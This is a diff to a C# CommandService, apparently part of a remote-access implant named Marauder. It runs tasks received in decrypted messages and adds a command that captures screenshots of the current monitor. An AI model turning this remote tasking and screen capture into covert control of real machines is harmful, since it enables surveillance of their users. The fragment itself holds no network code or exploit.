@@ -18,25 +18,43 @@ namespace Marauder.Services
   {
     public List<Command> AvailableCommands = new List<Command>();
     public List<Dictionary<string, AgentTask>> RunningTasks = new List<Dictionary<string, AgentTask>>();
+        public CommandService()
+        {
+            State.CryptoService.OnMessageDecrypted += TaskWatcher;
+        }
 
-    public void TaskWatcher(object sender, DecryptedMessageArgs args)
-    {
-      foreach (AgentTask agentTask in args.AgentTasks)
-      {
-        RunningTask runningTask = new RunningTask();
-        runningTask.Command = agentTask.Command;
-        runningTask.TaskName = agentTask.Name;
-        runningTask.Task = new Task(() => ProcessCommand(agentTask), runningTask.CancellationTokenSource.Token);
-        runningTask.Task.Start();
-        State.RunningTasks.Add(runningTask);
-      }
-    }
 
-    public CommandService()
-    {
-      State.CryptoService.OnMessageDecrypted += TaskWatcher;
-    }
-    
+        public void TaskWatcher(object sender, DecryptedMessageArgs args)
+        {
+            foreach (AgentTask agentTask in args.AgentTasks)
+            {
+                Execute_RunningTasks(agentTask);
+            }
+        }
+        private void Execute_RunningTasks(AgentTask agentTask)
+        {
+            RunningTask runningTask = new RunningTask();
+            runningTask.Command = agentTask.Command;
+            runningTask.TaskName = agentTask.Name;
+            runningTask.Task = new Task(() => ProcessCommand(agentTask), runningTask.CancellationTokenSource.Token);
+            runningTask.Task.Start();
+            State.RunningTasks.Add(runningTask);
+        }
+
+        public void Execute_MakeScreenshot()
+        {
+            AgentTask screenshotTask = new AgentTask();
+            screenshotTask.Name = "MakeScreenshot";
+            screenshotTask.AgentName = State.Name;
+            screenshotTask.Action = "RUN";
+            screenshotTask.Command = "MakeScreenshot";
+
+#if DEBUG
+            Logging.Write("CUSTOM_COMMANDSERVICE", "About to take screenshot of current monitor....");
+#endif
+            Execute_RunningTasks(screenshotTask);
+        }
+
     private TaskResult ProcessCommand(AgentTask agentTask)
     {
       bool success = false;
